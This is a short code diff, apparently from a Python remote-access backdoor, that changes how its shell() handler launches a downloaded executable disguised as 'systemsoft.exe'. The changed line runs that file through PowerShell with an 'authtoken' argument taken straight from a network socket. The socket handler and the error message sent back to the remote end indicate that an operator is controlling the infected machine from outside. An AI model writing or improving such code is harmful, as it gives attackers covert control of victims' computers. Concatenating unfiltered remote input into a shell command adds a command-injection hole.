@@ -926,7 +926,7 @@ def shell():
 
                 download_file(appd + '\\systemsoft.exe')
                 try:
-                    os.system(appd + '\\systemsoft.exe authtoken ' + s.recv(1024).decode())
+                    subprocess.Popen("powershell -c start " + appd + '\\systemsoft.exe authtoken ' + s.recv(1024).decode(),shell=True)
                 except:
                     s.send("[-] Error Adding your token".encode())
                 else:
